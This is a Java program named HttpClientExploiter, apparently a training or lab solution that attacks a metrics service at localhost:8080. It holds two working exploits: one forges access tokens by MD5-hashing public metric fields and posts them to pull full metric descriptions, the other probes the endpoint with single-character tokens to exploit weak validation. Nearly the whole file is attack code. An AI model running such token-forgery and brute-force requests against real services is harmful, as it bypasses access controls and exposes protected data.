import org.json.JSONObject;

import javax.xml.bind.DatatypeConverter;
import java.io.IOException;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Map;
import java.util.stream.IntStream;

public class HttpClientExploiter {

    private static final String URL_GET = "http://localhost:8080/metrics";
    private static final String URL_POST = URL_GET + "/metric";

    public static void main(String[] args) {
        var httpClient = HttpClient.newBuilder().version(HttpClient.Version.HTTP_1_1).build();
        try {
            System.out.println("""
                    =====================
                    First exploit results:
                    =====================
                    """);
            exploit1(httpClient);
            System.out.println("""
                                        
                                        
                    ======================
                    Second exploit results:
                    ======================
                    """);
            exploit2(httpClient);
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }

    private static void exploit1(HttpClient httpClient) throws IOException, InterruptedException {
        HttpRequest getRequest = HttpRequest.newBuilder()
                .uri(URI.create(URL_GET))
                .GET()
                .build();

        var response = httpClient.send(getRequest, HttpResponse.BodyHandlers.ofString());
        var jsonObject = new JSONObject(response.body());
        var metrics = jsonObject.getJSONArray("metrics");
        for (int i = 0; i < metrics.length(); i++) {
            var metric = metrics.getJSONObject(i);
            var token = calculateHash(metric.getString("device"), metric.getString("type"),
                    metric.getInt("value"), metric.getString("info"));
            var postRequest = HttpRequest.newBuilder()
                    .uri(URI.create(URL_POST))
                    .POST(HttpRequest.BodyPublishers.ofString(new JSONObject(Map.of("token", token)).toString()))
                    .build();
            // Таким образом получаем полные описания метрик:
            System.out.println(httpClient.send(postRequest, HttpResponse.BodyHandlers.ofString()).body());
        }
    }

    private static String calculateHash(String device, String type, int value, String info) {
        String stringToHash = device + type + value + info;
        MessageDigest md;
        try {
            md = MessageDigest.getInstance("MD5");
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException();
        }
        md.update(stringToHash.getBytes());
        byte[] digest = md.digest();
        return DatatypeConverter.printHexBinary(digest).toUpperCase();
    }

    private static void exploit2(HttpClient httpClient) throws IOException, InterruptedException {
        for (char ch = 'a'; ch <= 'f'; ch++) {
            System.out.println(doPostRequest(httpClient, String.valueOf(ch).toUpperCase()));
        }
        for (int i = 0; i <= 9; i++) {
            System.out.println(doPostRequest(httpClient, String.valueOf(i)));
        }
    }

    private static String doPostRequest(HttpClient httpClient, String token) throws IOException, InterruptedException {
        HttpRequest postRequest = HttpRequest.newBuilder()
                .uri(URI.create(URL_POST))
                .POST(HttpRequest.BodyPublishers.ofString("""
                        {
                            "token": "%s"
                        }
                        """.formatted(token)))
                .build();
        return httpClient.send(postRequest, HttpResponse.BodyHandlers.ofString()).body();
    }
}
